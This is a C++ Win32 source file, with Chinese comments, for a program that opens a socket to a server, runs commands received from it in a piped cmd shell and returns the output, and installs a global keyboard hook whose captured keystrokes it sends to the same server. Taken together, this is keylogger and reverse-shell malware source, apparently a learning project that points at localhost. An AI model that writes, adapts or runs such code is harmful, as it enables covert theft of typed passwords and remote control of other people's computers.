// TestWin32.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include <winsock2.h>	
#include "TestWin32.h"
#include "function.h"
#include "comment.h"
#include <iostream>
#include <Ws2tcpip.h>
#include <thread>
#pragma comment(lib, "ws2_32.lib")
#define MAX_LOADSTRING 100

extern HANDLE HMR;
extern HANDLE HMW;
extern HANDLE HCR;
extern HANDLE HCW;
extern SOCKET s;
unsigned rok = 1;

HANDLE g_hWnd;
//HWND g_hWnd; //窗口句柄
//告诉程序 MySetHook在哪	
#pragma comment(lib,"KeyHook.lib")
BOOL MySetHook(HWND hWnd); //引用dll	


// 全局变量: 
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明: 
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);


//WinMain 有界面的程序的入口函数

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此放置代码。
	//创建管道
	int nRet = Initcmd();
	if (!nRet)
	{
		OutputDebugStringA("Initcmd error");
		return 0;
	}

	//创建Socket ，并连接服务端
	 nRet = InitSocket();
	if (nRet == 0) {
		OutputDebugStringA("init socket error");
		return 0;
	}

	//2.connect主动连接服务器
	sockaddr_in  addr = { 0 };//用于替换socketaddr结构体，两者大小一致
	int  nLength = sizeof(sockaddr_in);
	addr.sin_family = AF_INET;//写死
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//固定套路，填写外网ip或本地ip 127.0.0.1
	addr.sin_port = htons(10087);//h:host to  n:network short //坑，网络字节序（大尾方式）和本地字节序(小尾方式)

	nRet = connect(s, (sockaddr*)&addr, nLength);
	if (SOCKET_ERROR == nRet)
	{
		OutputDebugStringA("connect error");
		return 0;
	}

	//等窗口创建成功之后再建立Socket

	std::thread thd1
	(
		[&]()
	{
		while (true) {
			DWORD lpTotalBytesAvail = 1;
			//读出文件（从管道中读出）
			while (true) {
				Sleep(50);//等待cmd程序执行
				char rBuf[256] = { 0 };
				PeekNamedPipe(HMR, NULL, NULL, NULL, &lpTotalBytesAvail, NULL
				);
				if (lpTotalBytesAvail == 0)
				{
					break;
				}
				nRet = ReadFile(
					HMR,
					rBuf,
					255,
					(LPDWORD)&rok,
					NULL
				);
				if (!nRet)
				{
					printf("rf error");
					return 0;
				}
				char szBufc[256];
				MyPacket* pPktc = (MyPacket*)szBufc;
				pPktc->type = PACKET_REQ_CMD;
				pPktc->length = strlen(rBuf) + 1;//仅仅表示数据长度，不包括结构体头部的前面2个4字节
				memcpy(pPktc->data, rBuf, pPktc->length);//将数据拷贝在包中
				int sended = send(s,
					(const char*)pPktc,
					pPktc->length + sizeof(unsigned int) * 2,
					0);
				if (sended != pPktc->length + sizeof(unsigned int) * 2)
				{
					printf("send error");
				}//send
			}
		}
	}
	);
	thd1.detach();





	std::thread thd2
	(
		[&]()
	{
		char szinBuf[256] = { 0 };
		while (true) {
			MyPacket* pPkt = (MyPacket*)szinBuf;
			//用recv去接受包的头，去看包中数据大小是多少
			nRet = recv(s, szinBuf, 8, 0);
			if (nRet > 0)
			{

				if (pPkt->type == PACKET_RLY_CMD) {

					OutputDebugStringA("123 456 789");
					nRet = recv(s, szinBuf, pPkt->length, 0);
					if (nRet > 0)
					{
					}
					else if (nRet == 0)
						printf("Connection closed\n");
					else
						printf("recv failed\n");//recv
												//读取对应数据大小的
				}
				else
					break;
			}
			int wnLength = strlen(szinBuf);
			if (wnLength > 255)
			{
				OutputDebugStringA("too long");
				return 0;
			}
			szinBuf[wnLength++] = '\n';

			//写入文件（向管道内写入）
			unsigned wok = 0;
			nRet = WriteFile(
				HMW,
				szinBuf,
				wnLength,
				(LPDWORD)&wok,
				NULL
			);
			if (!nRet)
			{
				OutputDebugStringA("wf error");
				return 0;
			}
			char rBuf[256] = { 0 };
			nRet = ReadFile(
				HMR,
				rBuf,
				wnLength,
				(LPDWORD)&rok,
				NULL
			);
			if (!nRet)
			{
				printf("rf error");
				return 0;
			}
		}
	}
	);
	thd2.detach();

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_TESTWIN32, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化: 
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_TESTWIN32));

    MSG msg;

    // 主消息循环: 
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}


//
//  函数: MyRegisterClass()
//
//  目的: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_TESTWIN32));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_TESTWIN32);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目的: 保存实例句柄并创建主窗口
//
//   注释: 
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   g_hWnd = hWnd; //保留窗口句柄
   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   //等窗口创建成功后，我们调用SetHook函数，下键盘钩子
   BOOL bRet = MySetHook(hWnd);

   if (!bRet) {
	   OutputDebugStringA("Set Hook Error!");
	   return 0;
   }

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的:    处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//


//响应对应的窗口信息回调函数
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
	case WM_COPYDATA: {

		//表示我们的dll发送的数据，我们到这里接受并处理
		PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;
		const char* pStr = (const char*)pcds->lpData;
	//	OutputDebugStringA((LPCSTR)(pcds->lpData));
		//向服务端发送数据
		char szBuf[256];

		MyPacket * pPkt =(MyPacket *)szBuf;
		pPkt->type = PACKET_REQ_KEYBOARD;
		pPkt->length = strlen(pStr) + 1;//仅仅表示数据长度，不包括结构体头部的前面2个4字节
		memcpy(pPkt->data, pStr, pPkt->length);//将数据拷贝在包中
		

		send(s,
			(const char*)pStr,
			pPkt->length + sizeof(unsigned int) * 2,
			0
		);
	}
	break;
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择: 
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
